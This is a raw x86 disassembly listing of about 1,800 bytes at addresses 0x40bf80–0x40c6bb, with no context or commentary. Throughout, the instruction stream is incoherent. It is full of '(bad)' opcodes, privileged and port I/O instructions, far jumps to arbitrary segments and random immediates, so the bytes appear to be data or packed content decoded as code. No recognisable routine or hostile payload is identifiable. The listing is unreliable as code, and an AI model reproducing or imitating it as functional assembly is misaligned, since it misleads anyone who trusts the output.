  40bf80:	data16 fstp TBYTE PTR [esi-0x2d10f50d]
  40bf87:	gs pop ecx
  40bf89:	cmp    DWORD PTR [ebp+edx*1-0x33],ebx
  40bf8d:	xor    bl,ah
  40bf8f:	cwde   
  40bf90:	push   esi
  40bf91:	cmp    dl,BYTE PTR [edx-0x7374995c]
  40bf97:	or     eax,0x523272b9
  40bf9c:	cli    
  40bf9d:	(bad)  
  40bf9e:	mov    DWORD PTR [edx-0x53e19c36],0x8fea3fc2
  40bfa8:	push   esp
  40bfa9:	ins    BYTE PTR es:[edi],dx
  40bfaa:	add    al,0xd
  40bfac:	fsub   st(6),st
  40bfae:	jmp    0x40bfdb
  40bfb0:	scas   al,BYTE PTR es:[edi]
  40bfb1:	xor    ch,BYTE PTR [edx+0x27]
  40bfb4:	cmp    dh,BYTE PTR [esi]
  40bfb6:	jle    0x40bf8e
  40bfb8:	jg     0x40c01d
  40bfba:	ins    DWORD PTR es:[edi],dx
  40bfbb:	push   cs
  40bfbc:	aas    
  40bfbd:	or     al,0xb9
  40bfbf:	mov    edx,0x1a0ac836
  40bfc4:	cli    
  40bfc5:	mov    bh,0x68
  40bfc7:	jo     0x40bf85
  40bfc9:	ins    DWORD PTR es:[edi],dx
  40bfca:	mov    ds:0x3d153cb8,eax
  40bfcf:	outs   dx,DWORD PTR ds:[esi]
  40bfd0:	push   esi
  40bfd1:	(bad)  
  40bfd2:	xlat   BYTE PTR ds:[ebx]
  40bfd3:	les    edi,FWORD PTR [edx+0x35]
  40bfd6:	repz sub BYTE PTR [ecx-0x1288b0ec],0x37
  40bfde:	xchg   dh,dl
  40bfe0:	lds    edi,FWORD PTR [esi-0x7]
  40bfe3:	dec    ecx
  40bfe4:	jge    0x40bfcf
  40bfe6:	aad    0xff
  40bfe8:	mov    eax,0x8604db0c
  40bfed:	mov    ecx,0x9c8a70d6
  40bff2:	fs into 
  40bff4:	xchg   esp,eax
  40bff5:	mov    di,0x9b37
  40bff9:	aam    0x2b
  40bffb:	mov    ?,WORD PTR [edx]
  40bffd:	and    ecx,esp
  40bfff:	mov    al,0x80
  40c001:	out    0x47,eax
  40c003:	cmp    BYTE PTR [ecx+0x630cbfcd],0xac
  40c00a:	es stos DWORD PTR es:[edi],eax
  40c00c:	cs jp  0x40c06f
  40c00f:	sub    bl,bh
  40c011:	in     al,0xc1
  40c013:	mov    ebx,0x464613c8
  40c018:	xor    eax,DWORD PTR [edx-0x3]
  40c01b:	pop    ebp
  40c01c:	jne    0x40bfba
  40c01e:	jo     0x40c06e
  40c020:	xor    ebp,ecx
  40c022:	retf   0xc37f
  40c025:	adc    ecx,esi
  40c027:	jle    0x40c08c
  40c029:	(bad)  
  40c02a:	out    0xb2,al
  40c02c:	xchg   ecx,eax
  40c02d:	xchg   DWORD PTR [eax],ebp
  40c02f:	sub    BYTE PTR ds:0x983aafde,dl
  40c035:	loope  0x40c08f
  40c037:	mov    eax,ds:0xd66fa7a2
  40c03c:	xchg   ebx,eax
  40c03d:	fcmovnb st,st(7)
  40c03f:	sub    eax,0x663befbb
  40c044:	push   ebx
  40c045:	add    eax,0x7757d6a9
  40c04a:	jae    0x40c021
  40c04c:	xor    al,0xc2
  40c04e:	mov    eax,0x75b031bf
  40c053:	jne    0x40bfda
  40c055:	mov    cl,0xd0
  40c057:	dec    eax
  40c058:	jmp    0x8528fa25
  40c05d:	faddp  st(4),st
  40c05f:	ret    
  40c060:	jo     0x40c06a
  40c062:	loope  0x40c044
  40c064:	test   eax,0x32a9c425
  40c069:	cs push es
  40c06b:	bound  edx,QWORD PTR [esi-0x40]
  40c06e:	inc    ecx
  40c06f:	(bad)
  40c072:	push   edi
  40c073:	pop    esp
  40c074:	test   DWORD PTR ds:0x1e7b3c2b,ebp
  40c07a:	cmp    ch,ch
  40c07c:	sbb    cl,cl
  40c07e:	mov    esp,0x94511516
  40c083:	shl    BYTE PTR [ebp+0x36273336],cl
  40c089:	fwait
  40c08a:	js     0x40c0a7
  40c08c:	jbe    0x40c0e7
  40c08e:	adc    ebp,DWORD PTR [esi-0x75]
  40c091:	std    
  40c092:	shl    BYTE PTR [ecx],cl
  40c094:	in     eax,0x71
  40c096:	dec    ecx
  40c097:	mov    ah,0x7d
  40c099:	jns    0x40c10f
  40c09b:	gs and al,0x2c
  40c09f:	(bad)  
  40c0a0:	retf   0x6898
  40c0a3:	sub    BYTE PTR [edx],ch
  40c0a5:	dec    ebp
  40c0a6:	cmp    eax,0x6669eef2
  40c0ab:	adc    al,0x46
  40c0ad:	loopne 0x40c09a
  40c0af:	adc    al,0x1
  40c0b1:	clc    
  40c0b2:	mov    ebx,0xd0e19181
  40c0b7:	std    
  40c0b8:	cdq    
  40c0b9:	nop
  40c0ba:	outs   dx,BYTE PTR ds:[esi]
  40c0bb:	icebp  
  40c0bc:	retf   0xe018
  40c0bf:	shl    BYTE PTR [edi+esi*2+0x3e],0x72
  40c0c4:	dec    esp
  40c0c5:	popa   
  40c0c6:	hlt    
  40c0c7:	inc    ebp
  40c0c8:	sub    DWORD PTR [ebx-0x68164a32],ebp
  40c0ce:	xor    eax,esp
  40c0d0:	pop    ecx
  40c0d1:	icebp  
  40c0d2:	pop    ebx
  40c0d3:	rcr    BYTE PTR ds:0x784632e,1
  40c0d9:	int    0x9c
  40c0db:	sbb    DWORD PTR [eax-0x2c32bcf8],ebp
  40c0e1:	jnp    0x40c0de
  40c0e3:	mov    cl,0x23
  40c0e5:	inc    edx
  40c0e6:	sbb    esi,ebp
  40c0e8:	pushf  
  40c0e9:	lds    edi,FWORD PTR [ecx-0x3b]
  40c0ec:	das    
  40c0ed:	inc    edi
  40c0ee:	xor    BYTE PTR [ebx+0x42976ed1],al
  40c0f4:	cwde   
  40c0f5:	mov    al,0xee
  40c0f7:	dec    ebx
  40c0f8:	pushf  
  40c0f9:	adc    DWORD PTR [esi],0xf851dee9
  40c0ff:	call   0xd2cd:0x3d01b64d
  40c106:	push   0x696ddb2e
  40c10b:	xchg   ebp,eax
  40c10c:	lods   eax,DWORD PTR ds:[esi]
  40c10d:	imul   BYTE PTR [ecx+0xb]
  40c110:	in     al,dx
  40c111:	jns    0x40c0a1
  40c113:	mov    al,0x6f
  40c115:	mov    edx,0xaecd486c
  40c11a:	pushf  
  40c11b:	mov    bh,dh
  40c11d:	js     0x40c16e
  40c11f:	fdiv   DWORD PTR [esi+0x5b]
  40c122:	data16 xlat BYTE PTR ds:[ebx]
  40c124:	test   eax,0xda2efac3
  40c129:	mov    cl,0x28
  40c12b:	scas   al,BYTE PTR es:[edi]
  40c12c:	inc    ebp
  40c12d:	iret   
  40c12e:	cwde   
  40c12f:	ret    
  40c130:	les    ebp,FWORD PTR [esi-0x40]
  40c133:	pop    ecx
  40c134:	dec    ecx
  40c135:	jp     0x40c17a
  40c137:	iret   
  40c138:	inc    ebx
  40c139:	test   al,0x16
  40c13b:	test   BYTE PTR [ecx],ah
  40c13d:	(bad)  
  40c13e:	std    
  40c13f:	je     0x40c189
  40c141:	mov    ebx,DWORD PTR [esi]
  40c143:	inc    edi
  40c144:	mov    edi,0x63127148
  40c149:	test   DWORD PTR [edx-0x15],esp
  40c14c:	cmp    BYTE PTR [ecx-0x37a4c795],dh
  40c152:	cs dec ebx
  40c154:	scas   al,BYTE PTR es:[edi]
  40c155:	push   edi
  40c156:	mov    edi,0xa0efc30b
  40c15b:	jbe    0x40c162
  40c15d:	cmp    ecx,DWORD PTR [ebp-0x581cecd9]
  40c163:	mov    edi,0xa38b3163
  40c168:	mov    ecx,0x588bada9
  40c16d:	pop    ds
  40c16e:	fs aaa 
  40c170:	xchg   esp,eax
  40c171:	add    BYTE PTR [esi+ebp*4],ch
  40c174:	jge    0x40c176
  40c176:	call   0xd134:0x2847d168
  40c17d:	xchg   ebp,eax
  40c17e:	loopne 0x40c174
  40c180:	xchg   DWORD PTR [edi+0x64],eax
  40c183:	cmp    al,0xaa
  40c185:	stos   DWORD PTR es:[edi],eax
  40c186:	syscall 
  40c188:	sti    
  40c189:	cwde   
  40c18a:	cmp    al,0x34
  40c18c:	xlat   BYTE PTR ds:[ebx]
  40c18d:	mov    cs,WORD PTR [edx+0x25cae8a0]
  40c193:	mov    bh,0x9f
  40c195:	cld    
  40c196:	push   0xc7bf91ef
  40c19b:	pop    esp
  40c19c:	ret    
  40c19d:	dec    eax
  40c19e:	sub    DWORD PTR [eax+edi*2],esp
  40c1a1:	jmp    0x9b63:0x2208c63
  40c1a8:	jmp    0x40c13a
  40c1aa:	inc    esi
  40c1ab:	sbb    DWORD PTR [ecx],esi
  40c1ad:	mov    eax,ds:0xffeb33fa
  40c1b2:	imul   esp,DWORD PTR [ecx+edx*1],0xfffffff0
  40c1b6:	or     al,0xa1
  40c1b8:	cwde   
  40c1b9:	sbb    al,0x97
  40c1bb:	jge    0x40c238
  40c1bd:	push   ecx
  40c1be:	sbb    eax,0x84aec523
  40c1c3:	repnz test ebp,edi
  40c1c6:	push   eax
  40c1c7:	es pop edx
  40c1c9:	fs xchg edx,eax
  40c1cb:	into   
  40c1cc:	inc    ebx
  40c1cd:	add    cl,BYTE PTR [ecx]
  40c1cf:	pop    edx
  40c1d0:	push   es
  40c1d1:	sbb    al,0xba
  40c1d3:	pmuludq mm7,QWORD PTR [edx]
  40c1d6:	jecxz  0x40c1e8
  40c1d8:	arpl   WORD PTR ds:0x55dc2075,ax
  40c1de:	and    esi,DWORD PTR ds:0x588ce965
  40c1e4:	and    eax,0x17ce4f01
  40c1e9:	adc    eax,0x82a2f6bc
  40c1ee:	mov    BYTE PTR [esi],bh
  40c1f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1f1:	adc    dh,BYTE PTR [edi+0x1f9811e1]
  40c1f7:	sbb    BYTE PTR [ebx+0x38],dh
  40c1fa:	and    ah,BYTE PTR [edi]
  40c1fc:	adc    al,0x76
  40c1fe:	mov    WORD PTR [ecx-0x2c8164ab],ss
  40c204:	mov    esi,0x2768aff2
  40c209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c20a:	scas   eax,DWORD PTR es:[edi]
  40c20b:	scas   al,BYTE PTR es:[edi]
  40c20c:	sar    DWORD PTR [edi],1
  40c20e:	adc    edx,edi
  40c210:	jge    0x40c199
  40c212:	and    bh,BYTE PTR [edx]
  40c214:	push   ds
  40c215:	pop    edi
  40c216:	adc    al,0x63
  40c218:	xor    BYTE PTR gs:[ecx-0x16],al
  40c21c:	inc    esp
  40c21d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c21e:	adc    DWORD PTR [ebx],esp
  40c220:	pop    ebx
  40c221:	cmp    DWORD PTR [edi-0x315cc3e7],edi
  40c227:	mov    ch,0x9c
  40c229:	add    ecx,DWORD PTR [eax-0x619438cd]
  40c22f:	rcl    DWORD PTR [ecx+0x66],cl
  40c232:	or     eax,0x9c6913b4
  40c237:	data16 fdivr st,st(1)
  40c23a:	pop    edi
  40c23b:	jo     0x40c2a0
  40c23d:	pop    eax
  40c23e:	cmp    bl,dh
  40c240:	jmp    0x13b05b8e
  40c245:	leave  
  40c246:	xchg   ebp,eax
  40c247:	lea    esp,[ebx+esi*2]
  40c24a:	mov    ah,0x98
  40c24c:	out    dx,eax
  40c24d:	fs je  0x40c29e
  40c250:	inc    esp
  40c251:	test   eax,0xbcd45f2c
  40c256:	jo     0x40c22e
  40c258:	int3   
  40c259:	mov    ebp,0x834343c5
  40c25e:	adc    eax,0xfe1903f5
  40c263:	test   al,0xe0
  40c265:	es dec ecx
  40c267:	sbb    edx,DWORD PTR [eax]
  40c269:	hlt    
  40c26a:	jecxz  0x40c238
  40c26c:	inc    edi
  40c26d:	ja     0x40c2d6
  40c26f:	daa    
  40c270:	mov    bh,0x67
  40c272:	lods   eax,DWORD PTR ds:[esi]
  40c273:	loopne 0x40c275
  40c275:	fs mov dl,0xd3
  40c278:	aas    
  40c279:	jg     0x40c2b5
  40c27b:	sbb    ecx,DWORD PTR [eax+0x29]
  40c27e:	std    
  40c27f:	cdq    
  40c280:	push   esi
  40c281:	daa    
  40c282:	inc    edx
  40c283:	push   esi
  40c284:	je     0x40c2b0
  40c286:	add    al,0x77
  40c288:	push   0xffffff84
  40c28a:	cmp    dl,BYTE PTR [eax+0x41]
  40c28d:	fsubr  QWORD PTR [edi-0x34]
  40c290:	sbb    BYTE PTR [ecx],al
  40c292:	or     eax,0x1fffeffd
  40c297:	pop    ds
  40c298:	fcmovbe st,st(3)
  40c29a:	scas   al,BYTE PTR es:[edi]
  40c29b:	pop    ebp
  40c29c:	fcomp  DWORD PTR [edx+ebx*2+0x29]
  40c2a0:	fwait
  40c2a1:	push   0x33
  40c2a3:	stos   DWORD PTR es:[edi],eax
  40c2a4:	lock or BYTE PTR [eax+0x33a704c3],bl
  40c2ab:	mov    ?,WORD PTR [edx+0x440c31c1]
  40c2b1:	sub    eax,0xf1dbbbb7
  40c2b6:	jecxz  0x40c24a
  40c2b8:	inc    eax
  40c2b9:	(bad)  [ecx+0x57]
  40c2bc:	test   DWORD PTR [ecx-0x18054c59],eax
  40c2c2:	rol    edx,0xe3
  40c2c5:	fs jae 0x40c258
  40c2c8:	xor    al,0x25
  40c2ca:	push   es
  40c2cb:	in     al,0x70
  40c2cd:	cwde   
  40c2ce:	or     al,0xe4
  40c2d0:	mov    eax,0x8120fb00
  40c2d5:	add    eax,DWORD PTR [edx]
  40c2d7:	add    BYTE PTR [esi],ah
  40c2d9:	cwde   
  40c2da:	sbb    ecx,edi
  40c2dc:	stc    
  40c2dd:	jecxz  0x40c315
  40c2df:	or     al,ah
  40c2e1:	pop    esi
  40c2e2:	push   cs
  40c2e3:	fdivrp st(1),st
  40c2e5:	mov    ah,0x68
  40c2e7:	mov    BYTE PTR [ecx+0x12],cl
  40c2ea:	jle    0x40c28d
  40c2ec:	push   es
  40c2ed:	adc    al,0xb0
  40c2ef:	adc    edi,ecx
  40c2f1:	cmpxchg DWORD PTR [ebp+0x2066dd33],ebp
  40c2f8:	lahf   
  40c2f9:	das    
  40c2fa:	fwait
  40c2fb:	inc    ecx
  40c2fc:	das    
  40c2fd:	xlat   BYTE PTR ds:[ebx]
  40c2fe:	test   eax,0xbb40d010
  40c303:	inc    ebp
  40c304:	rol    BYTE PTR [ecx-0x22],1
  40c307:	in     al,0x3
  40c309:	aam    0xd
  40c30b:	lods   eax,DWORD PTR ds:[esi]
  40c30c:	fild   WORD PTR [edx-0x1bc35b3a]
  40c312:	jae    0x40c29e
  40c314:	add    eax,0xf217b484
  40c319:	loop   0x40c37b
  40c31b:	neg    BYTE PTR [eax]
  40c31d:	sub    DWORD PTR [esi],esp
  40c31f:	mov    dl,0x3
  40c321:	data16 jg 0x40c356
  40c324:	out    dx,al
  40c325:	xor    al,0xeb
  40c327:	loope  0x40c2f2
  40c329:	mov    ds:0x8ddbb554,al
  40c32e:	(bad)  
  40c32f:	retf   0xa03f
  40c332:	inc    ebx
  40c333:	mov    eax,0x8dcae27d
  40c338:	push   ebp
  40c339:	fidiv  WORD PTR [ebx-0x2ad3cb14]
  40c33f:	cmp    DWORD PTR [esi],esp
  40c341:	inc    edx
  40c342:	jne    0x40c2ce
  40c344:	es mov eax,ebx
  40c347:	std    
  40c348:	mov    ?,WORD PTR [edx+0x34c23287]
  40c34e:	pop    esi
  40c34f:	dec    ebx
  40c350:	sub    DWORD PTR [eax],ebx
  40c352:	hlt    
  40c353:	or     ebx,ebp
  40c355:	sbb    ah,BYTE PTR [eax+eax*4+0xc0b5c81]
  40c35c:	sub    eax,0xe7585841
  40c361:	sbb    DWORD PTR [ebx-0x59e12701],0xffffffa3
  40c368:	jbe    0x40c31d
  40c36a:	fbstp  TBYTE PTR [edi-0x24635036]
  40c370:	mov    bl,0xf5
  40c372:	push   ebp
  40c373:	std    
  40c374:	dec    eax
  40c375:	pop    ss
  40c376:	lahf   
  40c377:	dec    edx
  40c378:	add    BYTE PTR [ebx+0x5361440f],bl
  40c37e:	ins    DWORD PTR es:[edi],dx
  40c37f:	sar    edi,1
  40c381:	mov    bl,0x36
  40c383:	dec    ebx
  40c384:	(bad)  
  40c385:	adc    ah,cl
  40c387:	ret    
  40c388:	jne    0x40c365
  40c38a:	mov    ebx,0x20e378e4
  40c38f:	push   ebp
  40c390:	jle    0x40c332
  40c392:	sbb    DWORD PTR [ebx-0x10123d7c],ebp
  40c398:	xor    DWORD PTR [eax+0x1a8e7cb5],edi
  40c39e:	jle    0x40c3df
  40c3a0:	jae    0x40c32a
  40c3a2:	dec    edi
  40c3a3:	dec    esp
  40c3a4:	cmp    cl,al
  40c3a6:	shl    DWORD PTR [ecx+0x7a5feb0d],1
  40c3ac:	stos   DWORD PTR es:[edi],eax
  40c3ad:	daa    
  40c3ae:	js     0x40c3eb
  40c3b0:	std    
  40c3b1:	ins    BYTE PTR es:[edi],dx
  40c3b2:	fnstcw WORD PTR [eax+0x13]
  40c3b5:	idiv   DWORD PTR [ebx]
  40c3b7:	test   DWORD PTR [edx+edx*1-0x460d5c74],edi
  40c3be:	std    
  40c3bf:	test   al,0x43
  40c3c1:	fld    DWORD PTR [ebx]
  40c3c3:	cli    
  40c3c4:	xchg   edx,eax
  40c3c5:	jecxz  0x40c3a2
  40c3c7:	pop    ebx
  40c3c8:	jge    0x40c40f
  40c3ca:	or     DWORD PTR [esp+ebx*4],0x1e
  40c3ce:	movntq QWORD PTR [edx+0x7f],mm1
  40c3d2:	ss xchg ebx,eax
  40c3d4:	adc    esp,0x697574d8
  40c3da:	loop   0x40c43c
  40c3dc:	adc    DWORD PTR [ebx],0xffffffbf
  40c3df:	clc    
  40c3e0:	test   ebx,edi
  40c3e2:	dec    edx
  40c3e3:	test   eax,0xbc7fdf19
  40c3e8:	imul   ebp,DWORD PTR [ebx],0xffffff9a
  40c3eb:	mov    ecx,0x83ee1863
  40c3f0:	lea    ecx,[ebx+edi*2+0x743a52a5]
  40c3f7:	not    bh
  40c3f9:	xchg   ebx,eax
  40c3fa:	jp     0x40c3b6
  40c3fc:	jb     0x40c417
  40c3fe:	mov    DWORD PTR [ecx],ebp
  40c400:	dec    ecx
  40c401:	into   
  40c402:	and    BYTE PTR [ebp+0x1],cl
  40c405:	sub    ecx,ebp
  40c407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c408:	out    dx,eax
  40c409:	fucom  st(5)
  40c40b:	pop    ds
  40c40c:	fist   WORD PTR [edx-0x20]
  40c40f:	adc    DWORD PTR [eax+0x67],edi
  40c412:	imul   ebp,DWORD PTR [esi+0x41],0xffffffdc
  40c416:	jmp    0x5c4456f3
  40c41b:	xor    al,cl
  40c41d:	pusha  
  40c41e:	adc    DWORD PTR [ebx-0x562fd591],ebx
  40c424:	pop    edi
  40c425:	fcomp  QWORD PTR [edi+0x32]
  40c428:	cmp    DWORD PTR [edi-0x7],esi
  40c42b:	imul   esp,esi,0x7a25d1ad
  40c431:	add    al,0x35
  40c433:	adc    BYTE PTR [edx],bl
  40c435:	cwde   
  40c436:	add    BYTE PTR [edi-0x75],al
  40c439:	out    0x46,al
  40c43b:	in     al,dx
  40c43c:	inc    ecx
  40c43d:	dec    ecx
  40c43e:	scas   eax,DWORD PTR es:[edi]
  40c43f:	xchg   edi,eax
  40c440:	jne    0x40c415
  40c442:	mov    cl,0x6b
  40c444:	sub    ecx,DWORD PTR [edx-0x12f751d5]
  40c44a:	xchg   ecx,eax
  40c44b:	ins    BYTE PTR es:[edi],dx
  40c44c:	mov    eax,0xa005896a
  40c451:	push   esi
  40c452:	jae    0x40c3f4
  40c454:	push   ebp
  40c455:	mov    dl,0x74
  40c457:	dec    ebp
  40c458:	add    al,BYTE PTR [esi+eax*2+0x70]
  40c45c:	leave  
  40c45d:	fnstcw WORD PTR [ebx-0x18]
  40c460:	mov    es,WORD PTR [eax-0x75]
  40c463:	sub    edx,esp
  40c465:	pop    ebx
  40c466:	in     eax,dx
  40c467:	rol    BYTE PTR [esi+0x7f],0x75
  40c46b:	jle    0x40c3fd
  40c46d:	xchg   esi,eax
  40c46e:	mov    dl,0x1
  40c470:	mov    ebp,0x58833d45
  40c475:	cmp    ebx,edi
  40c477:	mov    bl,BYTE PTR [ebp-0x26]
  40c47a:	retf   0xe8ba
  40c47d:	xchg   esi,eax
  40c47e:	jp     0x40c42e
  40c480:	or     DWORD PTR [esi],edi
  40c482:	cmp    al,0xa9
  40c484:	jns    0x40c465
  40c486:	icebp  
  40c487:	adc    BYTE PTR ds:0xe631195b,cl
  40c48d:	push   0xffffff87
  40c48f:	sub    eax,0x9783074
  40c494:	scas   al,BYTE PTR es:[edi]
  40c495:	lds    ecx,FWORD PTR [edi]
  40c497:	pop    edi
  40c498:	push   ebp
  40c499:	ins    BYTE PTR es:[edi],dx
  40c49a:	cmc    
  40c49b:	mov    bl,0x6a
  40c49d:	cmp    bl,BYTE PTR [esi-0x26af0fcd]
  40c4a3:	rol    DWORD PTR [edi],1
  40c4a5:	psadbw mm6,QWORD PTR [eax-0x3052cbd6]
  40c4ac:	pop    esp
  40c4ad:	popf   
  40c4ae:	vpmulhuw ymm5,ymm7,YMMWORD PTR [edx]
  40c4b2:	iret   
  40c4b3:	ror    edi,cl
  40c4b5:	or     bh,ah
  40c4b7:	repz mov fs,WORD PTR [edx+ebx*4]
  40c4bb:	shl    BYTE PTR [ebx-0x24],cl
  40c4be:	(bad)  
  40c4bf:	rol    DWORD PTR [edi+0x6868c8da],1
  40c4c5:	cmp    esi,DWORD PTR [ebp-0x7b]
  40c4c8:	cmp    esi,edi
  40c4ca:	sbb    esi,eax
  40c4cc:	push   eax
  40c4cd:	shl    BYTE PTR [ebx+0x2b],0xa6
  40c4d1:	scas   eax,DWORD PTR es:[edi]
  40c4d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4d3:	jo     0x40c503
  40c4d5:	xchg   edx,eax
  40c4d6:	ret    
  40c4d7:	pop    ecx
  40c4d8:	mov    bh,0xb9
  40c4da:	fimul  DWORD PTR [esp+esi*4]
  40c4dd:	fidiv  DWORD PTR [eax+0x7b8017ac]
  40c4e3:	pop    eax
  40c4e4:	push   0xb18d81b4
  40c4e9:	repnz xchg edx,eax
  40c4eb:	inc    esp
  40c4ec:	mov    eax,0xcde46934
  40c4f1:	inc    edi
  40c4f2:	in     al,dx
  40c4f3:	and    ah,BYTE PTR [ebx+0x68827a69]
  40c4f9:	retf   
  40c4fa:	add    BYTE PTR [ecx+edi*1],dl
  40c4fd:	bound  ecx,QWORD PTR [edi-0x38]
  40c500:	scas   al,BYTE PTR es:[edi]
  40c501:	mov    ch,0xc
  40c503:	jbe    0x40c4ec
  40c505:	xchg   ebp,eax
  40c506:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c507:	sub    ah,dh
  40c509:	pop    es
  40c50a:	maxps  xmm4,XMMWORD PTR [edi-0x5499833]
  40c511:	add    BYTE PTR [ebx],bh
  40c513:	(bad)  
  40c514:	xchg   esi,eax
  40c515:	out    0x13,eax
  40c517:	out    dx,al
  40c518:	test   eax,0x707be964
  40c51d:	jne    0x40c55d
  40c51f:	stos   DWORD PTR es:[edi],eax
  40c520:	sahf   
  40c521:	js     0x40c51e
  40c523:	xchg   esp,eax
  40c524:	ja     0x40c4cf
  40c526:	aam    0x67
  40c528:	mov    eax,0x12b4169d
  40c52d:	(bad)  
  40c52e:	in     al,0x70
  40c530:	dec    esp
  40c531:	cmp    eax,0xaa7fcffa
  40c536:	cld    
  40c537:	ins    DWORD PTR es:[edi],dx
  40c538:	(bad)  
  40c539:	jl     0x40c560
  40c53b:	xor    al,0x63
  40c53d:	inc    esi
  40c53e:	cli    
  40c53f:	neg    DWORD PTR [edx+ebp*8]
  40c542:	or     cl,bl
  40c544:	sub    eax,0x8c9c176c
  40c549:	lods   eax,DWORD PTR ds:[esi]
  40c54a:	retf   0x9c09
  40c54d:	sbb    al,BYTE PTR [ebp+0x4f]
  40c550:	sub    eax,DWORD PTR [esi]
  40c552:	iret   
  40c553:	mov    ds:0x7030db15,eax
  40c558:	lds    eax,FWORD PTR [edi]
  40c55a:	fadd   DWORD PTR [ecx-0x60]
  40c55d:	sub    al,0xc1
  40c55f:	add    eax,0x5c8ee53c
  40c564:	ror    BYTE PTR [ecx],cl
  40c566:	sbb    DWORD PTR [ecx-0x72],edi
  40c569:	rcl    DWORD PTR [eax],0x64
  40c56c:	push   edx
  40c56d:	adc    al,0xf
  40c56f:	in     eax,0xab
  40c571:	inc    esi
  40c572:	mov    ch,0xb7
  40c574:	repz sbb bl,BYTE PTR [ebx+edx*2]
  40c578:	jp     0x40c55f
  40c57a:	mov    ds:0xfdfd170c,al
  40c57f:	pop    ebx
  40c580:	(bad)  [edx-0x6a]
  40c583:	repnz push esi
  40c585:	push   ecx
  40c586:	mov    bl,0x92
  40c588:	lahf   
  40c589:	mov    cl,0x60
  40c58b:	mov    DWORD PTR [esi-0x46],edi
  40c58e:	and    eax,0x7784b193
  40c593:	retf   
  40c594:	fst    QWORD PTR [ecx]
  40c596:	xor    esp,esi
  40c598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c599:	outs   dx,DWORD PTR ds:[esi]
  40c59a:	mov    dl,0x7b
  40c59c:	or     ecx,0x22150eae
  40c5a2:	aad    0xa
  40c5a4:	retf   
  40c5a5:	out    0x96,eax
  40c5a7:	and    esp,ebp
  40c5a9:	in     al,0x93
  40c5ab:	and    eax,0x2bbd61e0
  40c5b0:	popa   
  40c5b1:	xchg   edx,eax
  40c5b2:	add    ebp,DWORD PTR [ecx]
  40c5b4:	outs   dx,BYTE PTR ds:[esi]
  40c5b5:	hlt    
  40c5b6:	inc    edx
  40c5b7:	(bad)  
  40c5b8:	(bad)  
  40c5ba:	fs xchg ebx,eax
  40c5bc:	outs   dx,DWORD PTR ds:[esi]
  40c5bd:	loope  0x40c552
  40c5bf:	adc    eax,0x4e6b77a1
  40c5c4:	mov    al,ds:0x3fcfa18b
  40c5c9:	rol    ecx,cl
  40c5cb:	rcl    DWORD PTR [edx+0x24],cl
  40c5ce:	cwde   
  40c5cf:	and    BYTE PTR [ebx-0x19f9c66b],al
  40c5d5:	popa   
  40c5d6:	(bad)
  40c5da:	das    
  40c5db:	sub    dl,ah
  40c5dd:	push   DWORD PTR [eax+0x5156320c]
  40c5e3:	inc    ecx
  40c5e4:	sahf   
  40c5e5:	jmp    0x40c593
  40c5e7:	int    0xf9
  40c5e9:	pcmpgtd mm7,mm3
  40c5ec:	or     DWORD PTR [ebx-0x541f21e7],eax
  40c5f2:	inc    edx
  40c5f3:	test   BYTE PTR ds:0x4c2ce952,dh
  40c5f9:	cmp    BYTE PTR [ebx+0x1b],cl
  40c5fc:	inc    ebx
  40c5fd:	adc    cl,BYTE PTR [edi+0x37]
  40c600:	mov    ds:0xfa3061a5,eax
  40c605:	in     eax,0x55
  40c607:	fs out dx,al
  40c609:	in     eax,dx
  40c60a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c60b:	std    
  40c60c:	adc    al,0xcc
  40c60e:	sub    BYTE PTR [edx],ah
  40c610:	mov    bl,0xd9
  40c612:	out    0x84,al
  40c614:	mov    WORD PTR [edx+0x56],ds
  40c617:	repz mov al,0x8d
  40c61a:	pop    ds
  40c61b:	sbb    edi,DWORD PTR [edx+0x59]
  40c61e:	mov    bl,0xa5
  40c620:	and    DWORD PTR ds:0x8aa3da79,esp
  40c626:	mov    ch,0xf3
  40c628:	jmp    0x40c659
  40c62a:	mov    cs,WORD PTR [edx+0x6f6b8a62]
  40c630:	pop    es
  40c631:	arpl   WORD PTR [ebx],dx
  40c633:	sub    bh,dl
  40c635:	imul   esp,DWORD PTR [ebp-0x7493f341],0xd
  40c63c:	out    0x84,eax
  40c63e:	add    DWORD PTR [edi-0x4],0x49
  40c642:	jne    0x40c687
  40c644:	push   ds
  40c645:	dec    ebx
  40c646:	sbb    edi,DWORD PTR [ebp-0x3535c486]
  40c64c:	in     eax,0x63
  40c64e:	dec    esi
  40c64f:	mov    al,ds:0xe96d94ad
  40c654:	mov    dh,0x6b
  40c656:	call   DWORD PTR [ebp-0x1ef2a06b]
  40c65c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c65d:	xchg   ebx,eax
  40c65e:	push   0xac29fe11
  40c663:	pop    ds
  40c664:	and    cl,bh
  40c666:	in     al,0x22
  40c668:	ins    BYTE PTR es:[edi],dx
  40c669:	dec    ebx
  40c66a:	mov    esp,0x3ec1657f
  40c66f:	popa   
  40c670:	enter  0x4aa2,0xa4
  40c674:	arpl   WORD PTR [edi+0x70],bx
  40c677:	(bad)  
  40c678:	sub    al,0xe4
  40c67a:	vpunpckhwd xmm7,xmm2,XMMWORD PTR [ebx]
  40c67e:	push   ebp
  40c67f:	ds pop esi
  40c681:	ins    BYTE PTR es:[edi],dx
  40c682:	adc    esi,DWORD PTR [edi+0x30]
  40c685:	popf   
  40c686:	stos   DWORD PTR es:[edi],eax
  40c687:	dec    esi
  40c688:	mov    dh,0xab
  40c68a:	pop    ebp
  40c68b:	mov    cl,BYTE PTR [ecx-0x5e3fb41]
  40c691:	je     0x40c6d3
  40c693:	das    
  40c694:	inc    edx
  40c695:	pop    ebx
  40c696:	repnz lods eax,DWORD PTR ds:[esi]
  40c698:	popa   
  40c699:	jl     0x40c630
  40c69b:	mov    edi,0x10a9fd51
  40c6a0:	adc    eax,0x7274d482
  40c6a5:	sub    dl,BYTE PTR [ebx+eiz*4]
  40c6a8:	add    dh,BYTE PTR [ecx+eax*4]
  40c6ab:	fstp   TBYTE PTR [eax+0x39]
  40c6ae:	mov    ds:0x2aedc4f3,al
  40c6b4:	call   0x5b0:0xc0b08a14
  40c6bb:	aam    0x3c
